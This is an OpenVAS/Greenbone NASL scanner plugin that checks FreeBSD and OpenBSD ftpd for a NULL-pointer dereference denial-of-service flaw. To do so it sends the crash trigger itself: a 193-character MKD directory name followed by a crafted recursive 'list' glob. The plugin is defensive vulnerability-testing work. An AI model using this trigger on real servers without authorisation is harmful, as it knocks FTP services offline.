# SPDX-FileCopyrightText: 2010 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100532");
  script_version("2023-12-20T05:05:58+0000");
  script_tag(name:"last_modification", value:"2023-12-20 05:05:58 +0000 (Wed, 20 Dec 2023)");
  script_tag(name:"creation_date", value:"2010-03-15 19:33:39 +0100 (Mon, 15 Mar 2010)");
  script_tag(name:"cvss_base", value:"7.1");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:N/A:C");
  script_name("FreeBSD and OpenBSD 'ftpd' NULL Pointer Dereference Denial Of Service Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/38559");
  script_xref(name:"URL", value:"http://www.openbsd.org/errata45.html");
  script_xref(name:"URL", value:"http://www.openbsd.org/errata46.html");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_category(ACT_DENIAL);
  script_family("FTP");
  script_copyright("Copyright (C) 2010 Greenbone AG");
  script_dependencies("ftpserver_detect_type_nd_version.nasl", "os_detection.nasl", "logins.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("Host/runs_unixoide", "ftp/banner/available");

  script_tag(name:"summary", value:"The FreeBSD and OpenBSD 'ftpd' service is prone to a denial of
  service (DoS) vulnerability because of a NULL-pointer dereference.");

  script_tag(name:"impact", value:"Successful exploits may allow remote attackers to cause denial-of-
  service conditions. Given the nature of this issue, attackers may also
  be able to run arbitrary code, but this has not been confirmed.");

  script_tag(name:"affected", value:"FreeBSD 8.0, 6.3, 4.9 OpenBSD 4.5 and 4.6.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"solution", value:"Updates are available. Please see the references for more information.");

  exit(0);
}

include("ftp_func.inc");
include("misc_func.inc");
include("port_service_func.inc");

ftpPort = ftp_get_port(default:21);
banner = ftp_get_banner(port:ftpPort);
if(!banner)
  exit(0);

result = ftp_get_cmd_banner(port:ftpPort, cmd:"SYST");
if("BSD" >!< result)
  exit(0);

soc1 = open_sock_tcp(ftpPort);
if(!soc1)
  exit(0);

kb_creds = ftp_get_kb_creds();
user = kb_creds["login"];
pass = kb_creds["pass"];

login_details = ftp_log_in(socket:soc1, user:user, pass:pass);
if(!login_details) {
  ftp_close(socket:soc1);
  exit(0);
}

crap = crap(length: 193, data: "W");
result = ftp_send_cmd(socket:soc1, cmd: string("MKD ", crap));

if("257" >!< result) {
  if(result !~ "550 W{193}: File exists") {
    ftp_close(socket:soc1);
    exit(0);
  }
}

ftpPort2 = ftp_get_pasv_port(socket:soc1);
if(!ftpPort2) {
  ftp_close(socket:soc1);
  exit(0);
}

soc2 = open_sock_tcp(ftpPort2, transport:get_port_transport(ftpPort));
if(!soc2) {
  ftp_close(socket:soc1);
  exit(0);
}

send(socket:soc1, data: string("list {W*/../W*/../W*/../W*/../W*/../W*/../W*/}\r\n"));
result1 = ftp_recv_line(socket:soc1);
result2 = ftp_recv_data(socket:soc2);

if(!result1 && !result2) {
  security_message(port:ftpPort);
  exit(0);
}

close(soc1);
close(soc2);
exit(0);
